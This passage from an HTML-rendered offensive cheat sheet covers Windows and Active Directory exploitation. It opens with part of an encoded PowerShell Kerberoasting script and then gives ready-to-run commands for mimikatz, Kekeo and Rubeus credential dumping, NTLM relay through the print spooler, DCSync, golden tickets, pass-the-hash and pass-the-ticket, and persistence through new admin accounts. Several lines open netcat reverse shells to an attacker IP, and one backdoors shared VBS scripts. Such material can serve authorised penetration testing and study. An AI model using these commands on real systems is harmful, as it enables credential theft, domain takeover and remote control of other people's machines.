ACAAIAAgACAAIAAgAD0AIAAkAFMAUABOAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIABUAGEAcgBnAGUAdAAgACAAIAAgACAAIAAgACAAIAA9ACAAJABUAGEAcgBnAGUAdABBAGMAYwBvAHUAbgB0AAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIABFAG4AYwByAHkAcAB0AGkAbwBuAFQAeQBwAGUAIAA9ACAAJABFAG4AYwBUAHkAcABlAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIABFAG4AYwBUAGkAYwBrAGUAdABQAGEAcgB0ACAAIAA9ACAAJABFAG4AYwBQAGEAcgB0ACAAIAAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAfQAgAHwAIABTAGUAbABlAGMAdAAtAE8AYgBqAGUAYwB0ACAAUwBQAE4ALABUAGEAcgBnAGUAdAAsAEUAbgBjAHIAeQBwAHQAaQBvAG4AVAB5AHAAZQAsAEUAbgBjAFQAaQBjAGsAZQB0AFAAYQByAHQACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACQAVABhAHIAZwBlAHQATABpAHMAdAAgACsAPQAgACQAVABhAHIAZwBlAHQAIAAgACAAIAAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgAH0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIABjAGEAdABjAGgAIAB7AAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIABXAHIAaQB0AGUALQBXAGEAcgBuAGkAbgBnACAAIgBDAG8AdQBsAGQAbgAnAHQAIABlAHgAdAByAGEAYwB0ACAAdABoAGUAIABFAG4AYwBUAGkAYwBrAGUAdABQAGEAcgB0ACAAbwBmACAAUwBQAE4AOgAgACQAUwBQAE4AIAAtACAAcAB1AHIAZwBlACAAdABoAGUAIAB0AGkAYwBrAGUAdAAgAGEAbgBkACAAdAByAHkAIABhAGcAYQBpAG4AIgAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgAH0ACgAgACAAIAAgACAAIAAgACAAfQAKACAAIAAgACAAfQAKACAAIAAgACAARQBuAGQAIAB7AAoAIAAgACAAIAAgACAAIAAgAGkAZgAgACgAIQAkAFQAYQByAGcAZQB0AEwAaQBzAHQALgBFAG4AYwBUAGkAYwBrAGUAdABQAGEAcgB0ACkAIAB7AAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAVwByAGkAdABlAC0ARQByAHIAbwByACAAIgBDAG8AdQBsAGQAIABuAG8AdAAgAHIAZQB0AHIAaQBlAHYAZQAgAGEAbgB5ACAAdABpAGMAawBlAHQAcwAhACIACgAgACAAIAAgACAAIAAgACAAfQAKACAAIAAgACAAIAAgACAAIABlAGwAcwBlAGkAZgAgACgAJABGAG8AcgBtAGEAdAApAAoAIAAgACAAIAAgACAAIAAgAHsACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAkAE8AdQB0AHAAdQB0ACAAPQAgAEAAKAApAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAVwByAGkAdABlAC0AVgBlAHIAYgBvAHMAZQAgACIAQwBvAG4AdgBlAHIAdABpAG4AZwAgACQAKAAkAFQAYQByAGcAZQB0AEwAaQBzAHQALgBDAG8AdQBuAHQAKQAgAHQAaQBjAGsAZQB0AHMAIAB0AG8AIAAkAEYAbwByAG0AYQB0ACAAZgBvAHIAbQBhAHQAIgAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgAGYAbwByAGUAYQBjAGgAIAAoACQAVABhAHIAZwBlAHQAIABpAG4AIAAkAFQAYQByAGcAZQB0AEwAaQBzAHQAKQAgAHsACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAGkAZgAgACgAJABUAGEAcgBnAGUAdAAuAEUAbgBjAHIAeQBwAHQAaQBvAG4AVAB5AHAAZQAgAC0AZQBxACAAIgBSAEMANAAtAEgATQBBAEMAIAAoADIAMwApACIAKQAgAHsACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAaQBmACAAKAAkAEYAbwByAG0AYQB0ACAALQBlAHEAIAAiAEsAZQByAGIAZQByAG8AYQBzAHQAIgApACAAewAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAFsAcwB0AHIAaQBuAGcAXQAkAE8AdQB0AHAAdQB0ACAAKwA9ACAAJABUAGEAcgBnAGUAdAAuAEUAbgBjAFQAaQBjAGsAZQB0AFAAYQByAHQAIAArACAAIgBcAG4AIgAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAB9AAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAGUAbABzAGUAaQBmACAAKAAoACQARgBvAHIAbQBhAHQAIAAtAGUAcQAgACIASgBvAGgAbgAiACkAIAAtAG8AcgAgACgAJABGAG8AcgBtAGEAdAAgAC0AZQBxACAAIgBIAGEAcwBoAGMAYQB0ACIAKQApACAAewAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACQAQQBjAGMAbwB1AG4AdAAgAD0AIAAkAFQAYQByAGcAZQB0AC4AVABhAHIAZwBlAHQAIAAtAHMAcABsAGkAdAAgACIAQAAiAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAJABPAHUAdABwAHUAdAAgACsAPQAgACIAYAAkAGsAcgBiADUAdABnAHMAYAAkADIAMwBgACQAKgAkACgAJABBAGMAYwBvAHUAbgB0AFsAMABdACkAYAAkACQAKAAkAEEAYwBjAG8AdQBuAHQAWwAxAF0AKQBgACQAJAAoACQAVABhAHIAZwBlAHQALgBTAFAATgApACoAYAAkACIAIAArACAAJABUAGEAcgBnAGUAdAAuAEUAbgBjAFQAaQBjAGsAZQB0AFAAYQByAHQALgBTAHUAYgBzAHQAcgBpAG4AZwAoADAALAAzADIAKQAgACsAIAAiAGAAJAAiACAAKwAgACQAVABhAHIAZwBlAHQALgBFAG4AYwBUAGkAYwBrAGUAdABQAGEAcgB0AC4AUwB1AGIAcwB0AHIAaQBuAGcAKAAzADIAKQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAB9AAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAB9AAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIABlAGwAcwBlACAAewAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIABXAHIAaQB0AGUALQBXAGEAcgBuAGkAbgBnACAAIgBUAGgAZQAgAHQAaQBjAGsAZQB0ACAAbwBmACAAUwBQAE4AOgAgACQAKAAkAFQAYQByAGcAZQB0AC4AUwBQAE4AKQAgAGkAcwAgAGUAbgBjAHIAeQBwAHQAZQBkACAAdwBpAHQAaAAgACQAKAAkAFQAYQByAGcAZQB0AC4ARQBuAGMAcgB5AHAAdABpAG8AbgBUAHkAcABlACkAIABlAG4AYwByAHkAdABpAG8AcABuACAAYQBuAGQAIABjAG8AdQBsAGQAbgAnAHQAIABiAGUAIABjAHIAYQBjAGsAZQBkACAAdwBpAHQAaAAgACQARgBvAHIAbQBhAHQALgAgAEMAdQByAHIAZQBuAHQAbAB5ACAAbwBuAGwAeQAgAFIAQwA0AC0ASABNAEEAQwAgAGkAcwAgAHMAdQBwAHAAbwByAHQAZQBkACkAIgAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAfQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgAH0ACgAgACAAIAAgACAAIAAgACAAfQAKACAAIAAgACAAIAAgACAAIABlAGwAcwBlACAAewAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACQATwB1AHQAcAB1AHQAIAA9ACAAJABUAGEAcgBnAGUAdABMAGkAcwB0AAoAIAAgACAAIAAgACAAIAAgAH0ACgAgACAAIAAgACAAIAAgACAAVwByAGkAdABlAC0AVgBlAHIAYgBvAHMAZQAgACIAcgBlAHQAdQByAG4AaQBuAGcAIAAkACgAJABPAHUAdABwAHUAdAAuAEMAbwB1AG4AdAApACAAdABpAGMAawBlAHQAcwAiAAoAIAAgACAAIAAgACAAIAAgAHIAZQB0AHUAcgBuACAAJABPAHUAdABwAHUAdAAgAAoAIAAgACAAIAB9ACAACgA="</span><span class="w">
</span><span class="n">powershell.exe</span><span class="w"> </span><span class="nt">-EncodedCommand</span><span class="w"> </span><span class="nv">$getTGSCipher</span><span class="w">
</span><span class="c"># or transfer it from your scripts if that doesn't work, and then run:</span><span class="w">
</span><span class="n">Import-Module</span><span class="w"> </span><span class="o">.</span><span class="nx">/Get-TGSCipher.ps1</span><span class="w">

</span><span class="c"># forcefully change the password of an AD user</span><span class="w">
</span><span class="n">Set-ADAccountPassword</span><span class="w"> </span><span class="nt">-Identity</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">username</span><span class="err">&gt;</span><span class="w"> </span><span class="nt">-Server</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">domain_name</span><span class="err">&gt;</span><span class="w"> </span><span class="nt">-OldPassword</span><span class="w"> </span><span class="p">(</span><span class="n">ConvertTo-SecureString</span><span class="w"> </span><span class="nt">-AsPlaintext</span><span class="w"> </span><span class="s2">"old"</span><span class="w"> </span><span class="nt">-force</span><span class="p">)</span><span class="w"> </span><span class="nt">-NewPassword</span><span class="w"> </span><span class="p">(</span><span class="n">ConvertTo-SecureString</span><span class="w"> </span><span class="nt">-AsPlainText</span><span class="w"> </span><span class="s2">"new"</span><span class="w"> </span><span class="nt">-Force</span><span class="p">)</span><span class="w">

</span><span class="c"># or in two steps, more readable:</span><span class="w">
</span><span class="nv">$Password</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">ConvertTo-SecureString</span><span class="w"> </span><span class="s2">"&lt;password&gt;"</span><span class="w"> </span><span class="nt">-AsPlainText</span><span class="w"> </span><span class="nt">-Force</span><span class="w"> 
</span><span class="n">Set-ADAccountPassword</span><span class="w"> </span><span class="nt">-Identity</span><span class="w"> </span><span class="s2">"&lt;ad_account_username&gt;"</span><span class="w"> </span><span class="nt">-Reset</span><span class="w"> </span><span class="nt">-NewPassword</span><span class="w"> </span><span class="nv">$Password</span><span class="w"> 

</span><span class="c"># add an account to a group</span><span class="w">
</span><span class="n">Add-ADGroupMember</span><span class="w"> </span><span class="s2">"&lt;group_name&gt;"</span><span class="w"> </span><span class="nt">-Members</span><span class="w"> </span><span class="s2">"&lt;ad_account_username&gt;"</span><span class="w">

</span><span class="c"># verify that the command worked with:</span><span class="w">
</span><span class="n">Get-ADGroupMember</span><span class="w"> </span><span class="nt">-Identity</span><span class="w"> </span><span class="s2">"&lt;group_name&gt;"</span><span class="w">
</span></code></pre></div>

<h3>mimikatz and Kekeo exploitation</h3>

<div class="highlight"><pre class="highlight powershell"><code><span class="c"># dump LSASecrets</span><span class="w">
</span><span class="n">token::elevate</span><span class="w">
</span><span class="nx">lsadump::secrets</span><span class="w">

</span><span class="c"># list active user sessions</span><span class="w">
</span><span class="n">privilege::debug</span><span class="w">
</span><span class="nx">sekurlsa::logonPasswords</span><span class="w"> </span><span class="nx">full</span><span class="w">

</span><span class="c"># perform a Kerberos delegation attack:</span><span class="w">

</span><span class="c"># in kekeo prompt:</span><span class="w">
</span><span class="n">tgt::ask</span><span class="w"> </span><span class="nx">/user:</span><span class="err">&lt;</span><span class="nx">user_with_constrained_delegation_perms</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">/domain:</span><span class="err">&lt;</span><span class="nx">target_domain</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">/password:</span><span class="err">&lt;</span><span class="nx">password_for_user</span><span class="err">&gt;</span><span class="w">

</span><span class="c"># then we generate TGS requests with the TGT</span><span class="w">
</span><span class="c"># example of service syntax: http/SERVER1.my.domain.loc</span><span class="w">
</span><span class="n">tgs::s4u</span><span class="w"> </span><span class="nx">/tgt:</span><span class="err">&lt;</span><span class="nx">tgt_filename</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">/user:</span><span class="err">&lt;</span><span class="nx">user_to_impersonate</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">/service:</span><span class="err">&lt;</span><span class="nx">service_to_impersonate</span><span class="err">&gt;</span><span class="w">

</span><span class="c"># then, in mimikatz prompt:</span><span class="w">
</span><span class="n">privilege::debug</span><span class="w">
</span><span class="nx">kerberos::ptt</span><span class="w">

</span><span class="c"># outside of mimikatz prompt, verify that tickets were imported</span><span class="w">
</span><span class="n">klist</span><span class="w">

</span><span class="c"># finally, create the PSSession</span><span class="w">
</span><span class="n">Enter-PSSession</span><span class="w"> </span><span class="nt">-ComputerName</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">server_name</span><span class="err">&gt;</span><span class="w">
</span></code></pre></div>

<h3>print spooler service</h3>

<div class="highlight"><pre class="highlight powershell"><code><span class="c"># the following conditions must be met to exploit this service:</span><span class="w">
</span><span class="c"># 1. machine account admin privileges</span><span class="w">
</span><span class="c"># 2. having a set of AD account credentials</span><span class="w">
</span><span class="c"># 3. network connectivity to the target's SMB service</span><span class="w">
</span><span class="c"># 4. the target host must be running the print spooler service</span><span class="w">
</span><span class="c"># 5. hosts must not have SMB signing enforced</span><span class="w">

</span><span class="c"># to check if the print spooler service is running, use this WMI query</span><span class="w">
</span><span class="n">GWMI</span><span class="w"> </span><span class="nx">Win32_Printer</span><span class="w"> </span><span class="nt">-Computer</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">server.domain_name</span><span class="err">&gt;</span><span class="w">

</span><span class="c"># if you get an access denied error, try this</span><span class="w">
</span><span class="n">Get-PrinterPort</span><span class="w"> </span><span class="nt">-ComputerName</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">server.domain_name</span><span class="err">&gt;</span><span class="w">

</span><span class="c"># note that this might work even if both commands failed</span><span class="w">

</span><span class="c"># then, check for the absence / presence of SMB signing from your attack box</span><span class="w">
</span><span class="c"># "enabled but not required" means we're good to go</span><span class="w">
</span><span class="n">nmap</span><span class="w"> </span><span class="nt">--script</span><span class="o">=</span><span class="n">smb2-security-mode</span><span class="w"> </span><span class="nt">-p445</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">other_server.domain_name</span><span class="err">&gt;</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">target_server.domain_name</span><span class="err">&gt;</span><span class="w">

</span><span class="c"># if everything is clear we can exploit the service with spoolsample for instance: https://github.com/leechristensen/SpoolSample</span><span class="w">

</span><span class="c"># first, set up a NTLM relay on your attack box</span><span class="w">
</span><span class="n">python3.9</span><span class="w"> </span><span class="nx">/opt/impacket/examples/ntlmrelayx.py</span><span class="w"> </span><span class="nt">-smb2support</span><span class="w"> </span><span class="nt">-t</span><span class="w"> </span><span class="nx">smb://</span><span class="s2">"&lt;server_we_control_IP&gt;"</span><span class="w"> </span><span class="nt">-debug</span><span class="w">

</span><span class="c"># in the server you control, run spoolsample</span><span class="w">
</span><span class="n">SpoolSample.exe</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">target_server.domain_name</span><span class="err">&gt;</span><span class="w"> </span><span class="s2">"&lt;attack_box_tun0&gt;"</span><span class="w">

</span><span class="c"># you should received an authentication attempt and a relay on your attack box</span><span class="w">
</span><span class="n">python3.9</span><span class="w"> </span><span class="nx">ntlmrelayx.py</span><span class="w"> </span><span class="nt">-smb2support</span><span class="w"> </span><span class="nt">-t</span><span class="w"> </span><span class="nx">smb://</span><span class="s2">"&lt;server_we_control_IP&gt;"</span><span class="w"> </span><span class="nt">-c</span><span class="w"> </span><span class="s1">'whoami /all'</span><span class="w"> </span><span class="nt">-debug</span><span class="w">
</span></code></pre></div>

<h3>GPOs exploitation</h3>

<p>see <a href="https://ovelny.sh/chaos/windows-exploitation/GPOs-exploitation/" rel="nofollow">this page.</a></p>

<h3>recovering credentials from a PXE Boot Image</h3>

<div class="highlight"><pre class="highlight powershell"><code><span class="c"># after recovering a BCD file, get powerpxe here to read its contents: https://github.com/wavestone-cdt/powerpxe</span><span class="w">
</span><span class="n">powershell</span><span class="w"> </span><span class="nt">-executionpolicy</span><span class="w"> </span><span class="nx">bypass</span><span class="w">
</span><span class="n">Import-Module</span><span class="w"> </span><span class="o">.</span><span class="nx">\PowerPXE.ps1</span><span class="w">
</span><span class="nv">$BCDFile</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"conf.bcd"</span><span class="w">
</span><span class="n">Get-WimFile</span><span class="w"> </span><span class="nt">-bcdFile</span><span class="w"> </span><span class="nv">$BCDFile</span><span class="w">

</span><span class="c"># the previous output will give you the location of the PXE Boot Image: download it with TFTP</span><span class="w">
</span><span class="n">tftp</span><span class="w"> </span><span class="nt">-i</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">IP</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">GET</span><span class="w"> </span><span class="s2">"&lt;PXE Boot Image Location&gt;"</span><span class="w"> </span><span class="nx">pxeboot.wim</span><span class="w">

</span><span class="c"># then recover credentials from the image</span><span class="w">
</span><span class="n">Get-FindCredentials</span><span class="w"> </span><span class="nt">-WimFile</span><span class="w"> </span><span class="nx">pxeboot.wim</span><span class="w">
</span></code></pre></div>

<h3>persistence</h3>

<div class="highlight"><pre class="highlight powershell"><code><span class="c"># add user</span><span class="w">
</span><span class="n">net</span><span class="w"> </span><span class="nx">user</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">username</span><span class="err">&gt;</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">password</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">/add</span><span class="w"> </span><span class="nx">/domain</span><span class="w"> 

</span><span class="c"># add user to group</span><span class="w">
</span><span class="n">net</span><span class="w"> </span><span class="nx">group</span><span class="w"> </span><span class="s2">"&lt;group_name&gt;"</span><span class="w"> </span><span class="nx">/add</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">username</span><span class="err">&gt;</span><span class="w">

</span><span class="c"># add user to local admins group</span><span class="w">
</span><span class="n">net</span><span class="w"> </span><span class="nx">localgroup</span><span class="w"> </span><span class="nx">administrators</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">username</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">/add</span><span class="w">
</span></code></pre></div>

<h2>privilege escalation, lateral movement &amp; pivoting</h2>

<div class="highlight"><pre class="highlight powershell"><code><span class="c"># if AlwaysInstallElevated is set to 1 with those commands, we can privesc with a custom installer</span><span class="w">
</span><span class="n">reg</span><span class="w"> </span><span class="nx">query</span><span class="w"> </span><span class="nx">HKLM\Software\Policies\Microsoft\Windows\Installer</span><span class="w">
</span><span class="n">reg</span><span class="w"> </span><span class="nx">query</span><span class="w"> </span><span class="nx">HKCU\Software\Policies\Microsoft\Windows\Installer</span><span class="w">

</span><span class="c"># generate a .msi payload with msfvenom, download it on the target then run</span><span class="w">
</span><span class="n">msiexec</span><span class="w"> </span><span class="nx">/quiet</span><span class="w"> </span><span class="nx">/qn</span><span class="w"> </span><span class="nx">/i</span><span class="w"> </span><span class="nx">C:\</span><span class="err">&lt;</span><span class="nx">your_path</span><span class="err">&gt;</span><span class="nx">\setup.msi</span><span class="w">

</span><span class="c"># powershell only, search objects that can be modified by everyone group</span><span class="w">
</span><span class="n">Get-ChildItem</span><span class="w"> </span><span class="s2">"C:\&lt;path_here&gt;"</span><span class="w"> </span><span class="nt">-Recurse</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Get-Acl</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="nf">?</span><span class="p">{</span><span class="bp">$_</span><span class="o">.</span><span class="nf">AccessToString</span><span class="w"> </span><span class="o">-match</span><span class="w"> </span><span class="s2">"Everyone\sAllow\s\sModify"</span><span class="p">}</span><span class="w">

</span><span class="c"># powershell only, search users with a SPN (service principal name) for potential kerberoasting</span><span class="w">
</span><span class="n">import-module</span><span class="w"> </span><span class="nx">activedirectory</span><span class="w">
</span><span class="n">get-aduser</span><span class="w"> </span><span class="nt">-ldapfilter</span><span class="w"> </span><span class="s2">"(serviceprincipalname=*)"</span><span class="w">

</span><span class="c"># grab the hash on attack box for kerberoasting</span><span class="w">
</span><span class="n">impacket-GetUserSPNs</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">domain_name</span><span class="err">&gt;</span><span class="nx">/</span><span class="err">&lt;</span><span class="nx">user</span><span class="err">&gt;</span><span class="p">:</span><span class="err">&lt;</span><span class="nx">password</span><span class="err">&gt;</span><span class="w"> </span><span class="nt">-request</span><span class="w">

</span><span class="c"># enable DCSync rights on user</span><span class="w">
</span><span class="n">Import-Module</span><span class="w"> </span><span class="o">.</span><span class="nx">\PowerView.ps1</span><span class="w"> </span><span class="c"># upload it first</span><span class="w">
</span><span class="n">Add-DomainObjectAcl</span><span class="w"> </span><span class="nt">-PrincipalIdentity</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">user</span><span class="err">&gt;</span><span class="w"> </span><span class="nt">-TargetIdentity</span><span class="w"> </span><span class="s2">"DC=&lt;domain&gt;,DC=&lt;local&gt;"</span><span class="w"> </span><span class="nt">-Rights</span><span class="w"> </span><span class="nx">DCSync</span><span class="w">
</span></code></pre></div>

<h3>mimikatz</h3>

<div class="highlight"><pre class="highlight powershell"><code><span class="c"># creating a golden ticket:</span><span class="w">
</span><span class="n">lsadump::lsa</span><span class="w"> </span><span class="nx">/inject</span><span class="w"> </span><span class="nx">/name:krbtgt</span><span class="w">
</span><span class="c"># take note of the info and complete the following command</span><span class="w">
</span><span class="n">kerberos::golden</span><span class="w"> </span><span class="nx">/user:</span><span class="w"> </span><span class="nx">/domain:</span><span class="w"> </span><span class="nx">/sid:</span><span class="w"> </span><span class="nx">/krbtgt:</span><span class="w"> </span><span class="nx">/id:</span><span class="w">

</span><span class="c"># run DCSync with mimikatz, do not use token::elevate or privilege::debug for this</span><span class="w">
</span><span class="n">lsadump::dcsync</span><span class="w"> </span><span class="nx">/all</span><span class="w"> </span><span class="nx">/csv</span><span class="w">

</span><span class="c"># pass-the-hash attacks:</span><span class="w">

</span><span class="c"># extract NTLM hashes from local SAM (only local users)</span><span class="w">
</span><span class="n">privilege::debug</span><span class="w">
</span><span class="nx">token::elevate</span><span class="w">
</span><span class="n">lsadump::sam</span><span class="w">

</span><span class="c"># extract NTLM hashes from LSASS (local users and domain users who recently logged onto the machine)</span><span class="w">
</span><span class="n">privilege::debug</span><span class="w">
</span><span class="nx">token::elevate</span><span class="w">
</span><span class="n">sekurlsa::msv</span><span class="w">

</span><span class="c"># use gathered hashes to perform a pass-the-hash attack (example with reverse shell, same effect as running runas /netonly)</span><span class="w">
</span><span class="n">token::revert</span><span class="w">
</span><span class="nx">sekurlsa::pth</span><span class="w"> </span><span class="nx">/user:</span><span class="err">&lt;</span><span class="nx">username</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">/domain:</span><span class="err">&lt;</span><span class="nx">domain_name</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">/ntlm:</span><span class="err">&lt;</span><span class="nx">hash</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">/run:</span><span class="s2">"c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 5555"</span><span class="w">

</span><span class="c"># pass-the-ticket attacks:</span><span class="w">

</span><span class="c"># with SYSTEM privileges, extract kerberos tickets and session keys from LSASS memory</span><span class="w">
</span><span class="n">privilege::debug</span><span class="w">
</span><span class="nx">sekurlsa::tickets</span><span class="w"> </span><span class="nx">/export</span><span class="w">

</span><span class="c"># inject the ticket into the current session</span><span class="w">
</span><span class="n">kerberos::ptt</span><span class="w"> </span><span class="p">[</span><span class="mi">0</span><span class="p">;</span><span class="mi">427</span><span class="n">fcd5</span><span class="p">]</span><span class="nt">-2-0-40e10000-Administrator</span><span class="err">@</span><span class="nx">krbtgt-</span><span class="err">&lt;</span><span class="nx">domain_name</span><span class="err">&gt;</span><span class="o">.</span><span class="nf">kirbi</span><span class="w">

</span><span class="c"># check if the tickets were correctly injected (outside mimikatz)</span><span class="w">
</span><span class="n">klist</span><span class="w">

</span><span class="c"># overpass-the-hash / pass-the-key attacks:</span><span class="w">

</span><span class="c"># obtain kerberos encryption keys from memory</span><span class="w">
</span><span class="n">privilege::debug</span><span class="w">
</span><span class="nx">sekurlsa::ekeys</span><span class="w">

</span><span class="c"># get a reverse shell via pass-the-Key</span><span class="w">
</span><span class="n">sekurlsa::pth</span><span class="w"> </span><span class="nx">/user:Administrator</span><span class="w"> </span><span class="nx">/domain:</span><span class="err">&lt;</span><span class="nx">domain_name</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">/</span><span class="err">&lt;</span><span class="nx">rc4</span><span class="o">|</span><span class="n">aes128</span><span class="o">|</span><span class="n">aes256</span><span class="err">&gt;</span><span class="p">:</span><span class="err">&lt;</span><span class="nx">hash</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">/run:</span><span class="s2">"c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 5556"</span><span class="w">
</span></code></pre></div>

<h3>rubeus</h3>

<p>compared to mimikatz, rubeus has the advantage of not needing administrative rights to perform pass the key / overpass the hash attacks.</p>

<div class="highlight"><pre class="highlight powershell"><code><span class="c"># export all tickets from LSASS as local admin</span><span class="w">
</span><span class="n">Rubeus.exe</span><span class="w"> </span><span class="nx">dump</span><span class="w"> </span><span class="nx">/nowrap</span><span class="w">

</span><span class="c"># perform pass the key / overpass the hash attack</span><span class="w">
</span><span class="c"># hash can also be /rc4, /aes128 or /des</span><span class="w">
</span><span class="c"># this retrieves the ticket in base6 format</span><span class="w">
</span><span class="n">Rubeus.exe</span><span class="w"> </span><span class="nx">asktgt</span><span class="w"> </span><span class="nx">/domain:</span><span class="err">&lt;</span><span class="nx">domain</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">/user:</span><span class="err">&lt;</span><span class="nx">username</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">/aes256:</span><span class="err">&lt;</span><span class="nx">hash</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">/nowrap</span><span class="w">

</span><span class="c"># perform a pass the ticket attack</span><span class="w">
</span><span class="c"># this have the same effect but will directly submit the ticket to the current logon session</span><span class="w">
</span><span class="n">Rubeus.exe</span><span class="w"> </span><span class="nx">asktgt</span><span class="w"> </span><span class="nx">/domain:</span><span class="err">&lt;</span><span class="nx">domain</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">/user:</span><span class="err">&lt;</span><span class="nx">user</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">/rc4:</span><span class="err">&lt;</span><span class="nx">hash</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">/ptt</span><span class="w">

</span><span class="c"># we can also import the ticket from a .kirbi file from the disk (obtained with mimikatz)</span><span class="w">
</span><span class="n">Rubeus.exe</span><span class="w"> </span><span class="nx">ptt</span><span class="w"> </span><span class="nx">/ticket:</span><span class="err">&lt;</span><span class="nx">ticket</span><span class="w"> </span><span class="nx">name</span><span class="err">&gt;</span><span class="o">.</span><span class="nf">kirbi</span><span class="w">

</span><span class="c"># or import the ticket in base64 format</span><span class="w">
</span><span class="n">Rubeus.exe</span><span class="w"> </span><span class="nx">ptt</span><span class="w"> </span><span class="nx">/ticket:</span><span class="err">&lt;</span><span class="nx">base64</span><span class="w"> </span><span class="nx">string</span><span class="err">&gt;</span><span class="w">

</span><span class="c"># to convert a .kirbi file to base64 format, use this command:</span><span class="w">
</span><span class="p">[</span><span class="n">Convert</span><span class="p">]::</span><span class="n">ToBase64String</span><span class="p">([</span><span class="n">IO.File</span><span class="p">]::</span><span class="n">ReadAllBytes</span><span class="p">(</span><span class="s2">"&lt;ticket name&gt;.kirbi"</span><span class="p">))</span><span class="w">

</span><span class="c"># create a sacrificial process</span><span class="w">
</span><span class="c"># this is used to open a new cmd window which will be the equivalent of runas /netonly</span><span class="w">
</span><span class="c"># we can use this to prevent erasure of existing TGTs for the current logon session when we start messing with tickets</span><span class="w">
</span><span class="n">Rubeus.exe</span><span class="w"> </span><span class="nx">createnetonly</span><span class="w"> </span><span class="nx">/program:</span><span class="s2">"C:\Windows\System32\cmd.exe"</span><span class="w"> </span><span class="nx">/show</span><span class="w">
</span></code></pre></div>

<h3>backdooring writeable shares</h3>

<div class="highlight"><pre class="highlight powershell"><code><span class="c"># backdooring .vbs scripts</span><span class="w">

</span><span class="c"># injecting a reverse shell into a .vbs script (needs nc64.exe on the same share)</span><span class="w">
</span><span class="n">CreateObject</span><span class="p">(</span><span class="s2">"WScript.Shell"</span><span class="p">)</span><span class="o">.</span><span class="nf">Run</span><span class="w"> </span><span class="s2">"cmd.exe /c copy /Y \\&lt;ip_address&gt;\myshare\nc64.exe %tmp% &amp; %tmp%\nc64.exe -e cmd.exe &lt;attacker_ip&gt; 1234"</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="n">True</span><span class="w">

</span><span class="c"># backdooring .exe files</span><span class="w">

</span><span class="c"># download the .exe and inject a backdoor with msfvenom</span><span class="w">
